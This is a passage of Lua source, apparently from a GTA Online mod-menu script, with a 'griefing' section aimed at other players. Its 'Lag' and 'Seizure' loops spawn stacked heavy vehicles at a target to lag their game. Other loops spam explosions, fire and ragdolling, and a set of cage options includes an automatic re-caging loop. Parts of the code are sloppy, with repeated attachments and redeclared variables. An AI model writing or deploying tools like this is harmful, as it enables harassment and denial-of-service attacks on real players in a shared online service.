menu.toggle_loop(lagwiths, "Lag With Khanjali's", {"lagwithkhanjali"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwiths, "Lag With Khanjali's V2", {"lagwithkhanjaliv2"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)


	seizures = menu.list(griefing, "Seizure Shit", {}, "", function(); end)

menu.toggle_loop(seizures, "Seizure V1", {"seizurev1"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


menu.toggle_loop(seizures, "Seizure V2", {"seizurev2"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargoplane")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargoplane")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
    entities.delete_by_handle(vehicle1)
end, nil, nil, COMMANDPERM_AGGRESSIVE)


	menu.toggle(seizures, "Seizure V3", {"seizurev3"}, "", function(on_toggle)
	if on_toggle then
			menu.trigger_commands("seizurev1" .. players.get_name(pid))
			menu.trigger_commands("seizurev2" .. players.get_name(pid))
	else
			menu.trigger_commands("seizurev1" .. players.get_name(pid))
			menu.trigger_commands("seizurev2" .. players.get_name(pid))
		end
	
	end)

    menu.toggle_loop(griefing, "TP On Ped Loop", {"tploopon"}, "", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    end)

    menu.toggle_loop(griefing, "Asteroid Smash", {"asteroidon"}, "Crush the player with an asteroid", function() 
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)

    menu.toggle_loop(griefing, "Ragdoll loop", {"ragdollon"}, "Keeps target ragdolled", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
        util.yield(10)
    end)

    menu.toggle_loop(griefing, "Flame loop", {"fireon"}, "Spam fire beneath the target", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 12, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(griefing, "Water Jet loop", {"wateron"}, "Spam water jets beneath the target", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 13, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(griefing, "Crap trail", {"crapon"}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 35, 0, false, false, 0, false)
        util.yield(65)
    end)

    menu.toggle_loop(griefing, "Huge Shit On Head", {"hshit"}, "Make a massive shit", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(100)
    entities.create_object(mshit, c)
    end)

menu.toggle_loop(griefing, "Normal Shit On Head", {"nshit"}, "Make a normale sized shit", function(on_toggle)
    menu.trigger_commands("tp" .. players.get_name(pid))
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(100)
    entities.create_object(rshit, c)
end)


    menu.toggle_loop(griefing, "Flame path", {}, "They better run", function()
        local coords = players.get_position(pid)
        --coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)

	cage_options = menu.list(griefing, "Cage Options", {}, "")

	menu.divider(cage_options, "Cage Options")

	menu.action(cage_options, "Simple", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
	menu.action(cage_options, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		--rot.y = 90
		--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
menu.action(cage_options, "Married Simulator", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "'Safe' Space", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Average X-Force User", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.action(cage_options, "money cage", {"moneycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

----------------------------------------------------------------------------------------------------------------------------------

	menu.action(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "automatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("Failed to kick player out of the vehicle", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
